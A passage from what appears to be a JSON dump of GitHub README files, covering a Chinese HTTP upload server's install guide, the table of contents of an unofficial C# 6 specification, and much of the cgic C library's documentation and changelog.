\u5ba2\u6237\u7aef\u652f\u6301\u91c7\u7528HTTP\u6807\u51c6\u534f\u8bae\u4e0a\u4f20\uff1b\n10.\u652f\u6301\u65ad\u70b9\u7eed\u4f20\uff0c\u65ad\u7f51\u3001\u5173\u673a\u91cd\u542f\u5747\u4e0d\u53d7\u5f71\u54cd\uff1b\n11.\u652f\u6301HTML5\u6d4f\u89c8\u5668\u4e0a\u4f20\u8fdb\u5ea6\u5b9e\u65f6\u663e\u793a\uff1b\n12.\u652f\u6301IE8\u53ca\u4ee5\u4e0a\u6d4f\u89c8\u5668\u4e0a\u4f20\u8fdb\u5ea6\u663e\u793a\uff1b\n13.\u652f\u6301\u67e5\u770b\u5ba2\u6237\u7aef\u5728\u7ebf\u8fde\u63a5\uff0c \u67e5\u770b\u65b9\u6cd5\uff1a http://ip:port/lists\n14.\u591a\u6d4f\u89c8\u5668\u517c\u5bb9\uff0c\u5305\u62ecChrome\uff0cFirefox\uff0cSafari\uff0cIE\uff0cOpera,Edge\uff1b\n\n## \u5b89\u88c5\n\n- \u7b2c\u4e00\u6b65\uff1a\u89e3\u538b\u6587\u4ef6\u5230\u4e00\u4e2a\u786c\u76d8\u76ee\u5f55\uff0c\u4f8b\u5982d:\\UploadServer\n\n- \u7b2c\u4e8c\u6b65\uff1a\u4fee\u6539\u914d\u7f6e\u6587\u4ef6 \n\t\t\u4fee\u6539d:\\UploadServer\\conf\\config.xml\uff0c\u6587\u4ef6\u91cc\u7684\u76ee\u5f55\u8bbe\u7f6e\uff0c\n\t\t\u5c06\u6240\u6709 dir= \u53d8\u91cf\u6307\u5411\u7684\u76ee\u5f55\u4fee\u6539\u4e3a\u786c\u76d8\u4e0a\u7684\u771f\u5b9e\u76ee\u5f55\uff0c\u5982\u679c\u6ca1\u6709\u5c31\u6309\u914d\u7f6e\u6587\u4ef6\u521b\u5efa\uff1b \n        \n- \u7b2c\u4e09\u6b65\uff1a\u5b89\u88c5\u670d\u52a1 <br/>\n        \u6267\u884ccmd\u6253\u5f00\u547d\u4ee4\u884c\u7a97\u53e3\u6309\u6b65\u9aa4\u8f93\u5165\u4ee5\u4e0b\u547d\u4ee4\uff1a <br/>\n        d:  <br/>\n        cd UploadServer <br/>\n        HYFileServer.exe -i  <br/>   \n        \n- \u7b2c\u56db\u6b65\uff1a\u542f\u52a8\u670d\u52a1 <br/>\n        \u6253\u5f00\u7cfb\u7edf\u7684\u670d\u52a1\u7ba1\u7406\u5668\uff0c\u627e\u5230Hyper Http Upload Service\u670d\u52a1\u542f\u52a8\u5b83\u3002\n                \n- \u7b2c\u4e94\u6b65\uff1a\u5728\u6d4f\u89c8\u5668\u91cc\u8f93\u5165 http://127.0.0.1:8080 \u67e5\u770b\u670d\u52a1\u5668\u8fd0\u884c\u662f\u5426\u6b63\u5e38 <br>\n        \u5982\u679c\u4e0a\u4f20\u9875\u9762\u6b63\u5e38\u663e\u793a\u8bf4\u660e\u5b89\u88c5\u6210\u529f <br>\n        \u70b9\u51fb\u5176\u4e2d\u4e00\u4e2a\u4e0a\u4f20\u6587\u4ef6\u94fe\u63a5 \u6309\u94ae\u6765\u4e0a\u4f20\u4e00\u4e2a\u6587\u4ef6\u3002 <br>\n        \u5982\u679c\u8981\u5728\u5176\u5b83\u4e3b\u673a\u4e0a\u8bbf\u95ee\u4e0a\u4f20\u670d\u52a1\u5668\u9875\u9762\uff0c\u8bf7\u5c06127.0.0.1\u7528\u5b89\u88c5\u670d\u52a1\u5668\u7684IP\u5730\u5740\u53d6\u4ee3\u3002 <br>\n        \u5982\u679c\u5916\u90e8\u673a\u5668\u8fd8\u4e0d\u80fd\u8bbf\u95ee\uff0c\u8bf7\u68c0\u67e5\u9632\u706b\u5899\u7684\u8bbe\u7f6e\uff0c\u770b\u4e00\u4e0b\u9ed8\u8ba4\u76848080\u7aef\u53e3\u662f\u5426\u5f00\u542f\u3002 <br>\n        \n- \u7b2c\u516d\u6b65\uff1a\u5982\u679c\u8981\u8fdb\u4e00\u6b65\u4e86\u89e3\u4e0a\u4f20\u670d\u52a1\u5668\uff0c\u8bf7\u67e5\u770b d:\\UploadServer\\doc\\\u6587\u4ef6\u4e0a\u4f20\u670d\u52a1\u5668\u4f7f\u7528\u624b\u518c.pdf \u6587\u4ef6 <br>\n\n- Linux \u4e0b\u6267\u884c\u5b89\u88c5  <br>\n./hyupdsrv  <br>\n\u5982\u679c\u8981\u4f5c\u4e3a\u5b88\u62a4\u8fdb\u7a0b\uff0c\u6267\u884c  <br>\n./hyupdsrv -d <br>\n\n## \u6280\u672f\u6587\u6863\n\u8bf7\u67e5\u770b doc \u76ee\u5f55\u4e0b\u7684\u8bf4\u660e\u624b\u518c\u3002\n\n## \u8054\u7edc\n- QQ:1918098288\n- Mail: 1918098288@qq.com\n\n\n\n\n\n\n\n\n"}, {"repo": "/ljw1004/csharpspec", "language": "HTML", "readme_contents": "C# Language Specification\n===========================\n__Version 6__\n\n*Microsoft has not yet released an official copy of the C#6 spec. This is an unofficial draft. __When Microsoft does release its official copy, before end 2016 at the latest, then this current repository will be deleted__. That's because I wouldn't want to have two copies of the C#6 spec floating around.*\n\n(This document is also available for download: [csharp.pdf](CSharp%20Language%20Specification.pdf?raw=true) and [csharp.docx](CSharp%20Language%20Specification.docx?raw=true))\n\n\n* [Introduction](introduction.md)\n    * [Hello world](introduction.md#hello-world)\n    * [Program structure](introduction.md#program-structure)\n    * [Types and variables](introduction.md#types-and-variables)\n    * [Expressions](introduction.md#expressions)\n    * [Statements](introduction.md#statements)\n    * [Classes and objects](introduction.md#classes-and-objects)\n* [Lexical structure](lexical-structure.md)\n    * [Programs](lexical-structure.md#programs)\n    * [Grammars](lexical-structure.md#grammars)\n    * [Lexical analysis](lexical-structure.md#lexical-analysis)\n    * [Tokens](lexical-structure.md#tokens)\n    * [Pre-processing directives](lexical-structure.md#pre-processing-directives)\n* [Basic concepts](basic-concepts.md)\n    * [Application Startup](basic-concepts.md#application-startup)\n    * [Application termination](basic-concepts.md#application-termination)\n    * [Declarations](basic-concepts.md#declarations)\n    * [Members](basic-concepts.md#members)\n    * [Member access](basic-concepts.md#member-access)\n    * [Signatures and overloading](basic-concepts.md#signatures-and-overloading)\n    * [Scopes](basic-concepts.md#scopes)\n    * [Namespace and type names](basic-concepts.md#namespace-and-type-names)\n    * [Automatic memory management](basic-concepts.md#automatic-memory-management)\n    * [Execution order](basic-concepts.md#execution-order)\n* [Types](types.md)\n    * [Value types](types.md#value-types)\n    * [Reference types](types.md#reference-types)\n    * [Boxing and unboxing](types.md#boxing-and-uboxing)\n    * [Constructed types](types.md#constructed-types)\n    * [Type parameters](types.md#type-parameters)\n    * [Expression tree types](types.md#expression-tree-types)\n    * [The dynamic type](types.md#the-dynamic-type)\n* [Variables](variables.md)\n    * [Variable categories](variables.md#variable-categories)\n    * [Default values](variables.md#default-values)\n    * [Definite assignment](variables.md#definite-assignment)\n    * [Variable references](variables.md#variable-references)\n    * [Atomicity of variable references](variables.md#atomicity-of-variable-references)\n* [Conversions](conversions.md)\n    * [Implicit conversions](conversions.md#implicit-conversions)\n    * [Explicit conversions](conversions.md#explicit-conversions)\n    * [Standard conversions](conversions.md#standard-conversions)\n    * [User-defined conversions](conversions.md#user-defined-conversions)\n    * [Anonymous function conversions](conversions.md#anonymous-function-conversions)\n    * [Method group conversions](conversions.md#method-group-conversions)\n* [Expressions](expressions.md)\n    * [Expression classifications](expressions.md#expression-classification)\n    * [Static and Dynamic Binding](expressions.md#static-and-dynamic-binding)\n    * [Operators](expressions.md#operators)\n    * [Member lookup](expressions.md#member-lookup)\n    * [Function members](expressions.md#function-members)\n    * [Primary expressions](expressions.md#primary-expressions)\n    * [Unary operators](expressions.md#unary-operators)\n    * [Arithmetic operators](expressions.md#arithmetic-operators)\n    * [Shift operators](expressions.md#shift-operators)\n    * [Relational and type-testing operators](expressions.md#relational-and-type-testing-operators)\n    * [Logical operators](expressions.md#logical-operators)\n    * [Conditional logical operators](expressions.md#conditional-logical-operators)\n    * [The null coalescing operator](expressions.md#the-null-coalescing-operator)\n    * [Conditional operator](expressions.md#conditional-operator)\n    * [Anonymous function expressions](expressions.md#anonymous-function-expressions)\n    * [Query expressions](expressions.md#query-expressions)\n    * [Assignment operators](expressions.md#assignment-operators)\n    * [Expression](expressions.md#expression)\n    * [Constant expressions](expressions.md#constant-expressions)\n    * [Boolean expressions](expressions.md#boolean-expressions)\n* [Statements](statements.md)\n    * [End points and reachability](statements.md#end-points-and-reachability)\n    * [Blocks](statements.md#blocks)\n    * [The empty statement](statements.md#the-empty-statement)\n    * [Labeled statements](statements.md#labeled-statements)\n    * [Declaration statements](statements.md#declaration-statements)\n    * [Expression statements](statements.md#expression-statements)\n    * [Selection statements](statements.md#selection-statements)\n    * [Iteration statements](statements.md#iteration-statements)\n    * [Jump statements](statements.md#jump-statements)\n    * [The try statement](statements.md#the-try-statement)\n    * [The checked and unchecked statements](statements.md#the-checked-and-unchecked-statements)\n    * [The lock statement](statements.md#the-lock-statement)\n    * [The using statement](statements.md#the-using-statement)\n    * [The yield statement](statements.md#the-yield-statement)\n* [Namespaces](namespaces.md)\n    * [Compilation units](namespaces.md#compilation-units)\n    * [Namespace declarations](namespaces.md#namespace-declarations)\n    * [Extern aliases](namespaces.md#extern-aliases)\n    * [Using directives](namespaces.md#using-directives)\n    * [Namespace members](namespaces.md#namespace-members)\n    * [Type declarations](namespaces.md#type-declarations)\n    * [Namespace alias qualifiers](namespaces.md#namespace-alias-qualifiers)\n* [Classes](classes.md)\n    * [Class declarations](classes.md#class-declarations)\n    * [Partial types](classes.md#partial-types)\n    * [Class members](classes.md#class-members)\n    * [Constants](classes.md#constants)\n    * [Fields](classes.md#fields)\n    * [Methods](classes.md#methods)\n    * [Properties](classes.md#properties)\n    * [Events](classes.md#events)\n    * [Indexers](classes.md#indexers)\n    * [Operators](classes.md#operators)\n    * [Instance constructors](classes.md#instance-constructors)\n    * [Static constructors](classes.md#static-constructors)\n    * [Destructors](classes.md#destructors)\n    * [Iterators](classes.md#iterators)\n* [Structs](structs.md)\n    * [Struct declarations](structs.md#struct-declarations)\n    * [Struct members](structs.md#struct-members)\n    * [Class and struct differences](structs.md#class-and-struct-differences)\n    * [Struct examples](structs.md#struct-examples)\n* [Arrays](arrays.md)\n    * [Array types](arrays.md#array-types)\n    * [Array creation](arrays.md#array-creation)\n    * [Array element access](arrays.md#array-element-access)\n    * [Array members](arrays.md#array-members)\n    * [Array covariance](arrays.md#array-covariance)\n    * [Array initializers](arrays.md#array-initializers)\n* [Interfaces](interfaces.md)\n    * [Interface declarations](interfaces.md#interface-declarations)\n    * [Interface members](interfaces.md#interface-members)\n    * [Fully qualified interface member names](interfaces.md#fully-qualified-interface-member-names)\n    * [Interface implementations](interfaces.md#interface-implementations)\n* [Enums](enums.md)\n    * [Enum declarations](enums.md#enum-declarations)\n    * [Enum modifiers](enums.md#enum-modifiers)\n    * [Enum members](enums.md#enum-members)\n    * [The System.Enum type](enums.md#the-systemenum-type)\n    * [Enum values and operations](enums.md#enum-values-and-operations)\n* [Delegates](delegates.md)\n    * [Delegate declarations](delegates.md#delegate-declarations)\n    * [Delegate compatibility](delegates.md#delegate-compatibility)\n    * [Delegate instantiation](delegates.md#delegate-instantiation)\n    * [Delegate invocation](delegates.md#delegate-invocation)\n* [Exceptions](exceptions.md)\n    * [Causes of exceptions](exceptions.md#causes-of-exceptions)\n    * [The System.Exception class](exceptions.md#the-systemexception-class)\n    * [How exceptions are handled](exceptions.md#how-exceptions-are-handled)\n    * [Common Exception Classes](exceptions.md#common-exception-classes)\n* [Attributes](attributes.md)\n    * [Attribute classes](attributes.md#attribute-classes)\n    * [Attribute specification](attributes.md#attribute-specification)\n    * [Attribute instances](attributes.md#attribute-instances)\n    * [Reserved attributes](attributes.md#reserved-attributes)\n    * [Attributes for Interoperation](attributes.md#attributes-for-interoperation)\n* [Unsafe code](unsafe-code.md)\n    * [Unsafe contexts](unsafe-code.md#unsafe-contexts-)\n    * [Pointer types](unsafe-code.md#pointer-types)\n    * [Fixed and moveable variables](unsafe-code.md#fixed-and-moveable-variables)\n    * [Pointer conversions](unsafe-code.md#pointer-conversions)\n    * [Pointers in expressions](unsafe-code.md#pointers-in-expressions)\n    * [The fixed statement](unsafe-code.md#the-fixed-statement)\n    * [Fixed size buffers](unsafe-code.md#fixed-size-buffers)\n    * [Stack allocation](unsafe-code.md#stack-allocation)\n    * [Dynamic memory allocation](unsafe-code.md#dynamic-memory-allocation)\n* [Documentation comments](documentation-comments.md)\n    * [Introduction](documentation-comments.md#introduction)\n    * [Recommended tags](documentation-comments.md#recommended-tags)\n    * [Processing the documentation file](documentation-comments.md#processing-the-documentation-file)\n    * [An example](documentation-comments.md#an-example)\n* Grammar: [csharp.html](http://ljw1004.github.io/csharpspec/csharp.html). Or download in ANTLR format: [csharp.g4](csharp.g4?raw=true). \n"}, {"repo": "/boutell/cgic", "language": "HTML", "readme_contents": "<h1>cgic 2.07: an ANSI C library for CGI Programming</h1>\n<h2>By <a href=\"http://boutell.dev\">Thomas Boutell</a></h2>\n<blockquote>\n<strong>IMPORTANT NOTICES:</strong>\n<p>\nIf you have CGIC 1.05 or earlier, you should upgrade to CGIC 1.07,\nor to CGIC 2.02 or better, in order to obtain important security fixes.\n<p>\nIf you have CGIC 2.0 or CGIC 2.01 and you use the cgiCookie routines, \nyou should upgrade to CGIC 2.02 or better, in order to obtain\nimportant security fixes.\n</blockquote>\n<h3>Table of Contents</h3>\n<ul>\n<li><a href=\"#credits\">Credits and license terms</a>\n<li><a href=\"#whatsnew205\">What's new in version XYZ of CGIC?</a>\n<li><a href=\"#whatis\">What is cgic?</a>\n<li><a href=\"#obtain\">Obtaining cgic</a>\n<li><a href=\"#build\">Building and testing cgic: a sample application</a>\n<li><a href=\"#nocompile\">What to do if it won't compile</a>\n<li><a href=\"#howto\">How to write a cgic application</a>\n<li><a href=\"#images\">How can I generate images from my cgic application?</a>\n<li><a href=\"#debug\">CGI debugging features: using capture</a>\n<li><a href=\"#functions\">cgic function reference</a>\n<li><a href=\"#variables\">cgic variable reference</a>\n<li><a href=\"#resultcodes\">cgic result code reference</a>\n<li><a href=\"#index\">cgic quick index</a>\n</ul>\n\n<h3><a name=\"credits\">Credits and License Terms</a></h3>\n\n<p>\ncgic is now distributed under the MIT license:\n</p>\n<p>\nCopyright (c) 1996-2019 Thomas Boutell\n</p>\n<p>\nPermission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the \"Software\"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:\n</p>\n<p>\nThe above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.\n</p>\n<p>\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n</p>\n<p>\nThanks are due to Robert Gustavsson, Ken Holervich, Bob Nestor, \nJon Ribbens, Thomas Strangert, Wu Yongwei, and other CGIC users \nwho have corresponded over the years. Although the implementation\nof multipart/form-data file upload support in CGIC 2.x is my own, \nI particularly wish to thank those who submitted their own \nimplementations of this feature.\n</p>\n<h3><a name=\"whatsnew207\">What's new in version 2.07?</a></h3>\nPer a suggestion by Geoff Mulligan, cgic now tolerates keys without a value in URL-encoded GET and POST submissions. Although the HTML5 spec discourages it, there are existing systems in the wild that do leave the `=` off entirely if the value is an empty string. Beginning with version 2.07, `cgic` handles this as you'd expect: you get an entry with the corresponding key and an empty string as the value. A simple unit test compilation target was also added, to test this feature and rule out side effects.\n<h3><a name=\"whatsnew206\">What's new in version 2.06?</a></h3>\nA long list of significant fixes generously contributed by Jeffrey Hutzelman.\n<a href=\"https://github.com/boutell/cgic/commit/2065a2dfa480209bd6171acb2a4edd6e1c27a062\"> These are especially important on platforms where attempting to read beyong the content length stated by the request can lead to a deadlock. Please see the commit notes.</a>\n<h3><a name=\"whatsnew205\">What's new in version 2.05?</a></h3>\nUploaded files properly closed; corrects a resource leak and enables\nfile uploads to work properly on platforms with particular file\nlocking semantics.\n<h3><a name=\"whatsnew204\">What's new in version 2.04?</a></h3>\nDocumentation fixes: the cgiHtmlEscape, cgiHtmlEscapeData,\ncgiValueEscape, and cgiValueEscapeData routines were named\nincorrectly in the manual. No code changes in version 2.04.\n<h3><a name=\"whatsnew203\">What's new in version 2.03?</a></h3>\n<ul>\n<li>Support for setting cookies has been reimplemented. The new\ncode closely follows the actual practice of web sites that successfully\nuse cookies, rather than attempting to implement the specification.\nThe new code can successfully set more than one cookie at a time in\ntypical web browsers.\n</ul>\n<h3><a name=\"whatsnew202\">What's new in version 2.02?</a></h3>\n<ul>\n<li>In CGIC 2.0 and 2.01, if the HTTP_COOKIE environment variable\nwas exactly equal to the name of a cookie requested with cgiCookieString,\nwith no value or equal sign or other characters present, a buffer\noverrun could take place. This was not normal behavior and it is\nunknown whether any actual web server would allow it to occur, however\nwe have of course released a patch to correct it. \nThanks to Nicolas Tomadakis.\n<li>cgiCookieString returned cgiFormTruncated when cgiFormSuccess would\nbe appropriate. Fixed; thanks to Mathieu Villeneuve-Belair.\n<li>Cookies are now set using a simpler Set-Cookie: header, and with\none header line per cookie, based on data collected by Chunfu Lai. \n<li>Memory leaks in cgiReadEnvironment fixed by Merezko Oleg. These\nmemory leaks were <em>not</em> experienced in a normal CGI situation, only\nwhen reading a saved CGI environment.\n</ul>\n<h3><a name=\"whatsnew201\">What's new in version 2.01?</a></h3>\n<ul>\n<li>Makefile supports \"make install\"\n<li>Compiles without warnings under both C and C++ with strict\nwarnings and strict ANSI compliance enabled\n<li>Builds out of the box on Windows (#include &lt;fcntl.h&gt; was needed)\n<li>Rare problem in cgiReadEnvironment corrected; no impact on\nnormal CGI operations\n<li>cgiCookieString now sets the result to an empty string\nwhen returning cgiFormNotFound\n<li>Minor code cleanups\n</ul>\n<h3><a name=\"whatsnew200\">What's new in version 2.0?</a></h3>\n1. CGIC 2.0 provides support for file upload fields. User-uploaded\nfiles are kept in temporary files, to avoid the use of\nexcessive swap space (Solaris users may wish to change the\n<code>cgicTempDir</code> macro in cgic.c before compiling).\nThe <code><a href=\"#cgiFormFileName\">cgiFormFileName</a></code>, \n<code><a href=\"#cgiFormFileContentType\">cgiFormFileContentType</a></code>, \n<code><a href=\"#cgiFormFileSize\">cgiFormFileSize</a></code>, \n<code><a href=\"#cgiFormFileOpen\">cgiFormFileOpen</a></code>, \n<code><a href=\"#cgiFormFileRead\">cgiFormFileRead</a></code>, and\n<code><a href=\"#cgiFormFileClose\">cgiFormFileClose</a></code> functions\nprovide a complete interface to this new functionality. Remember,\nthe <code>enctype</code> attribute of the <code>form</code> tag\nmust be set to <code>multipart/form-data</code> when\n<code>&lt;input type=\"file\"&gt;</code> tags are used.\n<p>\n2. CGIC 2.0 provides support for setting and examining cookies\n(persistent data storage on the browser side).\nThe <code><a href=\"#cgiCookieString\">cgiCookieString</a></code>,\nand <code><a href=\"#cgiCookieInteger\">cgiCookieInteger</a></code>\nand <code><a href=\"#cgiCookies\">cgiCookies</a></code>\nfunctions retrieve cookies. The \n<code><a href=\"#cgiHeaderCookieSetString\">cgiHeaderCookieSetString</a></code>\nand <code><a href=\"#cgiHeaderCookieSetInteger\">cgiHeaderCookieSetInteger</a></code> functions set cookies.\n<p>\n3. CGIC 2.0 offers a convenient way to retrieve a list of all form fields.\nThe new <code><a href=\"#cgiFormEntries\">cgiFormEntries</a></code>\nfunction performs this operation.\n<p>\n4. CGIC 2.0 provides convenience functions to correctly escape\ntext before outputting it as part of HTML, or as part of the \nvalue of a tag attribute, such as the <code>HREF</code> or\n<code>VALUE</code> attribute. See \n<code><a href=\"#cgiHtmlEscape\">cgiHtmlEscape</a></code>,\n<code><a href=\"#cgiHtmlEscapeData\">cgiHtmlEscapeData</a></code>,\n<code><a href=\"#cgiValueEscape\">cgiValueEscape</a></code> and\n<code><a href=\"#cgiValueEscapeData\">cgiValueEscapeData</a></code>.\n<p>\n5. Users have often asked the correct way to determine which submit\nbutton was clicked. This could always be accomplished in previous versions,\nbut CGIC 2.0 also provides \n<a href=\"#cgiFormSubmitClicked\">cgiFormSubmitClicked</a>,\na convenient alternate label for the \n<a href=\"#cgiFormCheckboxSingle\">cgiFormCheckboxSingle</a> function.\n<h3><a name=\"whatsnew107\">What's new in version 1.07?</a></h3>\nA problem with the cgiFormString and related functions has been\ncorrected. These functions were previously incorrectly returning cgiFormTruncated\nin cases where the returned string fit the buffer exactly.\n<h3><a name=\"whatsnew106\">What's new in version 1.06?</a></h3>\n1. A potentially significant buffer overflow problem has been\ncorrected. Jon Ribbens correctly pointed out to me (and to the\nInternet's bugtraq mailing list) that the cgiFormEntryString\nfunction, which is used directly or indirectly by almost all\nCGIC programs, can potentially write past the buffer passed\nto it by the programmer. This bug has been corrected.\nUpgrading to version 1.06 is <strong>strongly recommended.</strong>\n<P>\n2. The function <code>cgiSaferSystem()</code> has been\nremoved entirely. This function escaped only a few metacharacters,\nwhile most shells have many, and there was no way to account for\nthe many different operating system shells that might be in use\non different operating systems. Since this led to a false sense\nof security, the function has been removed. It is our recommendation\nthat user input should never be passed directly on the command line\nunless it has been carefully shown to contain only characters\nregarded as safe and appropriate by the programmer. Even then, it is\nbetter to design your utilities to accept their input from standard\ninput rather than the command line.\n<h3><a name=\"whatsnew105\">What's new in version 1.05?</a></h3>\nNon-exclusive commercial license fee reduced to $200.\n<h3><a name=\"whatsnew104\">What's new in version 1.04?</a></h3>\nFor consistency with other packages, the standard Makefile\nnow produces a true library for cgic (libcgic.a). \n<h3><a name=\"whatsnew103\">What's new in version 1.03?</a></h3>\nVersion 1.03 sends line feeds only (ascii 10) to end \nContent-type:, Status:, and other HTTP protocol output lines,\ninstead of CR/LF sequences. The standard specifies CR/LF.\nUnfortunately, too many servers reject CR/LF to make\nimplementation of that standard practical. No server\ntested ever rejects LF alone in this context. \n<h3><a name=\"whatsnew102\">What's new in version 1.02?</a></h3>\nVersion 1.02 corrects bugs in previous versions:\n<ul>\n<li>\n<a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded</a> specified\nits arguments in the wrong order, with surprising results.\nThis bug has been corrected.\n<li>\nMany small changes have been made to increase compatibility.\ncgic now compiles with no warnings under the compilers\navailable at boutell.dev.\n</ul>\n<h3><a name=\"whatsnew101\">What's new in version 1.01?</a></h3>\nVersion 1.01 adds no major functionality but corrects \nsignificant bugs and incompatibilities:\n<ul>\n<li>\n<a href=\"#cgiFormInteger\">cgiFormInteger</a>,\n<a href=\"#cgiFormIntegerBounded\">cgiFormIntegerBounded</a>,\n<a href=\"#cgiFormDouble\">cgiFormDouble</a> and\n<a href=\"#cgiFormDoubleBounded\">cgiFormDoubleBounded</a> now\naccept negative numbers properly. They also accept positive\nnumbers with an explicit + sign.\n<li>Hex values containing the digit <code>9</code> are\nnow properly decoded.\n<li><a href=\"#cgiFormString\">cgiFormString</a> now\nrepresents each newline as a single line feed (ascii 10 decimal)\nas described in the documentation, not a carriage return\n(ascii 13 decimal) as in version 1.0. The latter approach\npleased no one.\n<li><a href=\"#cgiFormString\">cgiFormString</a> and\n<a href=\"#cgiFormStringNoNewlines\">cgiFormStringNoNewlines</a>\nno longer erroneously return cgiFormEmpty in place of\ncgiFormSuccess.\n<li>The main() function of cgic now flushes standard output\nand sleeps for one second before exiting in order to inhibit\nproblems with the completion of I/O on some platforms. This was\nnot a cgic bug per se, but has been reported as a common problem\nwith CGI when used with the CERN server. This change should\nimprove compatibility.\n<li>The single selection example in the testform.html\nexample now works properly. This was an error in the\nform itself, not cgic.\n<li><a href=\"#cgiRemoteUser\">cgiRemoteUser</a> and\n<a href=\"#cgiRemoteIdent\">cgiRemoteIdent</a> are now\ndocumented accurately. They were reversed earlier.\n</ul>\n<h3><a name=\"whatis\">What is cgic?</a></h3>\ncgic is an ANSI C-language library for the creation of CGI-based\nWorld Wide Web applications. For basic information about\nthe CGI standard, see the <a href=\"http://hoohoo.ncsa.uiuc.edu/cgi/\">\nCGI documentation</a> at NCSA.\n<p>\ncgic performs the following tasks:\n<ul>\n<li>Parses form data, correcting for defective and/or inconsistent browsers\n<li>Transparently accepts both GET and POST form data\n<li>Accepts uploaded files as well as regular form fields\n<li>Provides functions to set and retrieve \"cookies\"\n(browser-side persistent information)\n<li>Handles line breaks in form fields in a consistent manner\n<li>Provides string, integer, floating-point, and single- and\nmultiple-choice functions to retrieve form data\n<li>Provides bounds checking for numeric fields\n<li>Loads CGI environment variables into C strings which are always non-null\n<li>Provides a way to capture CGI situations for replay in a debugging\nenvironment, including file uploads and cookies\n</ul>\n<p>\ncgic is compatible with any CGI-compliant server environment, and\ncompiles without modification in Posix/Unix/Linux and Windows\nenvironments.\n<h3><a name=\"obtain\">Obtaining cgic</a></h3>\ncgic is distributed via the web in two forms: as a Windows-compatible\n.ZIP file, and as a gzipped tar file. Most users of Windows and\nrelated operating systems have access to 'unzip' or 'pkunzip'. All modern Unix \nsystems come with 'gunzip' and 'tar' as standard equipment, and gzip/gunzip\nis not difficult to find if yours does not. Versions\nof these programs for other operating systems are widely\navailable if you do not already have them.\n<p>\n<strong>Important:</strong> to use cgic, you will need an ANSI-standard\nC compiler. Under Unix, just obtain and use gcc. Most Unix systems have\nstandardiszed on gcc. Users of Windows operating systems should not have\nANSI C-related problems as all of the popular compilers follow the ANSI \nstandard.\n<p>\n<strong>Note for Windows Programmers:</strong> you must use a modern\n32-bit compiler. Visual C++ 2.0 or higher, Borland C++ and the\nmingw32 gcc compiler are all appropriate, as is cygwin. Do \n<strong>NOT</strong> use an ancient 16-bit DOS executable compiler, please.\n<blockquote>\n<h4>What Operating System Does Your WEB SERVER Run?</h4>\nRemember, the computer on your desk is usually NOT your web server.\nCompiling a Windows console executable will not give you a CGI program that\ncan be installed on a Linux-based server. \n</blockquote>\nYour web browser should inquire whether to save the file to disk\nwhen you select one of the links below. Under Unix and compatible\noperating systems, save it, then issue the following\ncommands to unpack it:\n<pre>\ngunzip cgic207.tar.gz\ntar -xf cgic207.tar\n</pre>\nThis should produce the subdirectory 'cgic207', which will contain\nthe complete cgic distribution for version 2.07, including a copy of this \ndocumentation in the file cgic.html.\n<p>\nUnder Windows and compatible operating systems, save it,\nopen a command prompt window, and issue the following commands to unpack it:\n<pre>\nunzip /d cgic207.zip\n</pre>\nOr use the unzip utility of your choice.\n<p>\nThis command also produces the subdirectory 'cgic207', which will contain\nthe complete cgic distribution, including a copy of this \ndocumentation in the file cgic.html.\n<p>\ncgic is available via the web from www.boutell.dev:\n<ul>\n<li><a href=\"http://www.boutell.dev/cgic/cgic207.tar.gz\">Obtain cgic: gzipped tar file</a>\n<li><a href=\"http://www.boutell.dev/cgic/cgic207.zip\">Obtain cgic: .ZIP file</a>\n</ul>\n<h3><a name=\"build\">Building cgic: a sample application</a></h3>\nThe sample application 'cgictest.c' is provided as part of the\ncgic distribution. This CGI program displays an input form, \naccepts a submission, and then displays what was submitted.\nIn the process essentially all of cgic's features are tested.\n<p>\nOn a Unix system, you can build cgictest simply by typing\n'make cgictest.cgi'. cgic.c and cgictest.c will be compiled and linked\ntogether to produce the cgictest application. Under non-Unix\noperating systems, you will need to create and compile an appropriate\nproject containing the files cgic.c and cgictest.c. \n<p>\n<strong>IMPORTANT:</strong> after compiling cgictest.cgi, you will\nneed to place it in a location on your server system which is\ndesignated by your server administrator as an appropriate location\nfor CGI scripts. Some servers are configured to recognize any\nfile ending in .cgi as a CGI program when it is found in any\nsubdirectory of the server's web space, but this is not always\nthe case! The right locations for CGI\nprograms vary greatly from one server to another. Resolving\nthis issue is between you, your web server administrator,\nand your web server documentation. Before submitting a bug\nreport for cgic, make certain that the CGI example programs\nwhich came with your server <em>do</em> work for you. Otherwise\nit is very likely that you have a server configuration problem.\n<p>\nOnce you have moved cgictest.cgi (or cgictest.exe, under Windows)\nto an appropriate cgi directory,\nuse the web browser of your choice to access the URL at which\nyou have installed it \n(for instance, <code>www.mysite.com/cgi-bin/cgictest.cgi</code>).\nFill out the various fields in any manner you wish, then\nselect the SUBMIT button.\n<p>\nIf all goes well, cgictest.cgi will respond with a page which\nindicates the various settings you submitted. If not,\nplease reread the section above regarding the correct location in\nwhich to install your CGI program on your web server.\n<h3><a name=\"nocompile\">What to do if it won't compile</a></h3>\n<ul>\n<li><strong>Are you using Visual C++ or Borland C++? Did you forget to add\ncgic.c to your project?</strong>\n<li><strong>Make sure you are using an ANSI C or C++ compiler.</strong>\n(All of the Windows compilers are ANSI C compliant.)\n</ul>\nIf none of the above proves effective, please see the\nsection regarding <a href=\"#support\">support</a>.\n<h3><a name=\"howto\">How to write a cgic application</a></h3>\n<em>Note: </em> All cgic applications must be linked to the cgic.c module\nitself. How to do this depends on your operating system; under Unix,\njust use the provided Makefile as an example.\n<p>\nSince all CGI applications must perform certain initial\ntasks, such as parsing form data and examining\nenvironment variables, the cgic library provides its\nown main() function. When you write applications that\nuse cgic, you will begin your own programs by writing\na cgiMain() function, which cgic will invoke when\nthe initial cgi work has been successfully completed. Your\nprogram must also be sure to #include the file cgic.h.\n<p>\n<strong>Important:</strong> if you write your own main()\nfunction, your program 